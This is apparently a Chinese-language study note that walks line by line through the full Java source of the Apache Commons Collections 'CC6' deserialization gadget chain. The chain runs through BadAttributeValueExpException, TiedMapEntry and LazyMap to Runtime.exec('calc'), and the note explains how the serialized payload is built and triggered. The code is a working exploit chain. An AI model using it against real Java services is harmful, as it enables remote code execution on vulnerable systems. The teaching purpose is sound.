---
title: CC6
date: 2026-11-06
description: 关于CC6的相关知识
---
<!-- more -->
# CC6 完整逐行详解（JDK8u102 可用，这条链的触发入口：`BadAttributeValueExpException.readObject()`）

先一句话总链路：

> `readObject() → BadAttributeValueExpException.val.toString() → TiedMapEntry.toString() → LazyMap.get() → ChainedTransformer.transform() → 链式反射调用 Runtime.exec()`

> CC1 的入口是 `AnnotationInvocationHandler.readObject()`，在 8u71 之后被修复；CC6 换了 JDK 自带的 `BadAttributeValueExpException` 当入口，所以 8u102 还能跑。

---

## 第一部分：import 导入（先快速回顾）

java

```
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
```

- `Transformer`：CC 库顶层接口，只有一个方法 `transform(Object input)`，输入对象、返回处理后的对象，所有变换类都实现它。
- `ChainedTransformer`：链式 Transformer，**依次执行数组里每一个 Transformer，上一个的返回值传给下一个**，CC 链核心调度器。
- `ConstantTransformer`：不管输入是什么，永远返回你构造时传入的固定对象。
- `InvokerTransformer`：反射调用器！接收【方法名、参数类型数组、参数值数组】，内部用反射执行方法，命令执行的核心。
- `TiedMapEntry`：包装 Map 和 key，它的 `toString()` 方法会调用 `map.get(key)`，CC6 关键跳板。
- `LazyMap`：装饰器包装普通 Map，**当 get 一个不存在的 key 时，自动调用绑定的 Transformer.transform ()**，这就是触发点。

java

```
import javax.management.BadAttributeValueExpException;
```

CC6 的**入口类**。它重写了 `readObject()`：反序列化的时候，会执行 `this.val.toString()`。

> 重点：这个类是 JDK 自带、实现了 Serializable，8u102 没有修复这个逻辑！CC1 挂了之后，这个类成为替代入口。

java

```
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
```

序列化工具：

- `ByteArrayOutputStream`：把序列化后的二进制数据写到内存字节数组（不用落地成文件）
- `ObjectOutputStream`：序列化对象，输出二进制
- `ByteArrayInputStream`：从字节数组读数据
- `ObjectInputStream`：反序列化，`readObject()` 是触发反序列化漏洞的函数

java

```
import java.lang.reflect.Field;
```

Java 反射 Field，用来**修改私有成员变量 val**。`BadAttributeValueExpException` 的 val 是 private，不能直接赋值。

java

```
import java.util.HashMap;
import java.util.Map;
```

原生 HashMap，被 LazyMap 包装的底层 map。

java

```
public class CC6sample {
    public static void main(String[] args) throws Exception {
```

主类，main 方法，所有异常直接抛出（EXP 写法，生产不能这样）

---

## 第二块：构造反射执行链（Transformer 数组）

java

```
Transformer[] transformers = new Transformer[]{
        new ConstantTransformer(Runtime.class),
```

第 1 步：`ConstantTransformer`，**无论传进来什么，固定返回 Runtime.class**

> 目标：拿到 Runtime 这个 Class 对象，为后面 getMethod 做准备。

java

```
        new InvokerTransformer("getMethod",
                new Class[]{String.class, Class[].class},
                new Object[]{"getRuntime", new Class[0]}),
```

第 2 步：InvokerTransformer 反射调用 `Runtime.class.getMethod("getRuntime")`

- 方法名：`getMethod`
- 参数类型：`String.class, Class[].class`（getMethod 需要【方法名、参数类型列表】）
- 参数：`"getRuntime"`，空参数数组

> 执行完得到：`Method getRuntime()` 对象（静态方法）

java

```
        new InvokerTransformer("invoke",
                new Class[]{Object.class, Object[].class},
                new Object[]{null, new Object[0]}),
```

第 3 步：调用 `method.invoke(null)`

- invoke 第一个参数是实例，静态方法填 null
- 无参数

> 执行完得到：`Runtime.getRuntime()` → Runtime 实例！

java

```
        new InvokerTransformer("exec",
                new Class[]{String.class},
                new Object[]{"calc"})
};
```

第 4 步：调用 `runtime.exec("calc")`，弹出计算器。

> 这一整条数组，交给 ChainedTransformer 串行跑。

java

```
ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
```

把上面 4 步打包成链式变换：

输入 → ConstantTransformer → Invoker1 → Invoker2 → Invoker3 → 命令执行。

> 现在这个 chainedTransformer 本身不会自动跑！**必须有人调用它的 transform () 才会执行**。我们要找一条调用链，让反序列化流程自动走到 transform。

---

## 第三块：LazyMap + TiedMapEntry 跳板构造

java

```
Map innerMap = new HashMap();
Map lazyMap = LazyMap.decorate(innerMap, chainedTransformer);
```

`LazyMap.decorate(原始map, 绑定的transformer)`

规则：

当执行 `lazyMap.get(key)`：

1. 如果 key 已经在 innerMap 里面 → 直接返回 value
2. 如果 key 不存在 → 调用 `transformer.transform(key)`，把返回值 put 进 map，再返回

我们后面就是要触发 `lazyMap.get("testkey")`，从而执行 chainedTransformer。

java

```
TiedMapEntry entry = new TiedMapEntry(lazyMap, "testkey");
```

TiedMapEntry 源码关键：

java

```
public String toString() {
    return this.map.get(this.key).toString();
}
```

只要调用 `entry.toString()` → 自动执行 `lazyMap.get("testkey")` → 触发 transform！

这是第二层跳板。

---

## 第四块：入口类 BadAttributeValueExpException + 反射改 val

java

```
BadAttributeValueExpException bad = new BadAttributeValueExpException("aaa");
```

先 new 一个对象，构造参数只是初始化 val 为字符串 "aaa"，后面我们要覆盖掉 val。

java

```
Field valField = BadAttributeValueExpException.class.getDeclaredField("val");
valField.setAccessible(true);
valField.set(bad, entry);
```

- `val` 是 BadAttributeValueExpException 的私有成员变量
- `setAccessible(true)`：关闭权限检查，暴力读写 private 字段
- `valField.set(bad, entry)`：把 `bad.val` 从原来的字符串，替换成我们造好的 `TiedMapEntry` 对象！

👉 现在 `bad.val = TiedMapEntry(lazyMap, "testkey")`

看 `BadAttributeValueExpException.readObject()` 原生逻辑：

java

```
private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException {
    ois.defaultReadObject();
    val.toString();
}
```

**反序列化的时候，自动执行 val.toString ()！**

这就是 CC6 整条链的启动开关！

链路串起来：

plaintext

```
ois.readObject()
→ BadAttributeValueExpException.readObject()
→ val.toString()  // val是TiedMapEntry
→ TiedMapEntry.toString()
→ lazyMap.get("testkey")
→ LazyMap里面没有testkey，执行 chainedTransformer.transform(key)
→ 链式Transformer依次执行
→ Runtime.exec("calc")
```

---

## 第五块：序列化（生成 payload）

java

```
ByteArrayOutputStream bos = new ByteArrayOutputStream();
ObjectOutputStream oos = new ObjectOutputStream(bos);
oos.writeObject(bad);
oos.close();
byte[] payload = bos.toByteArray();
```

- `oos.writeObject(bad)`：把我们精心构造好的 `BadAttributeValueExpException` 对象序列化为二进制
- 二进制存在内存字节数组 payload 里

> 真实攻击场景：这个 payload 字节流发给目标，目标那边调用 `ObjectInputStream.readObject()`，就触发。本地代码这里只是把【生成 payload】和【本地反序列化测试】写在一起了。

---

## 第六块：本地测试：反序列化触发

java

```
ByteArrayInputStream bis = new ByteArrayInputStream(payload);
ObjectInputStream ois = new ObjectInputStream(bis);
ois.readObject();
ois.close();
```

`ois.readObject()` 是触发器！

读到对象 → 调用 BadAttributeValueExpException 的 readObject 方法 → 整条链跑起来，弹出 calc。

---

# 重要坑点总结（手写 CC6 必记）

1. 为什么 CC1 不能在 8u102 跑、CC6 可以？
    
    CC1 入口：`AnnotationInvocationHandler.readObject()`，8u71 修改了逻辑，不再调用 memberValue.toString ()；
    
    CC6 入口：`BadAttributeValueExpException.readObject()`，8u102 还保留 `val.toString()`。
2. LazyMap 是 get 不存在 key 才触发；
3. TiedMapEntry 的核心是 toString 调用 map.get；
4. 必须反射修改 BadAttributeValueExpException 的私有 val 字段；
5. 整条链所有类都要实现 Serializable（CC 库这几个类都已经序列化好了，不用自己写）

# 默写顺序（你自己手写推荐这个顺序）

1. 导入包
2. 写 Transformer 数组（Constant + 三段 Invoker）
3. ChainedTransformer 组装
4. LazyMap.decorate
5. TiedMapEntry 封装 map+key
6. new BadAttributeValueExpException，反射修改 val
7. 序列化代码
8. 反序列化测试代码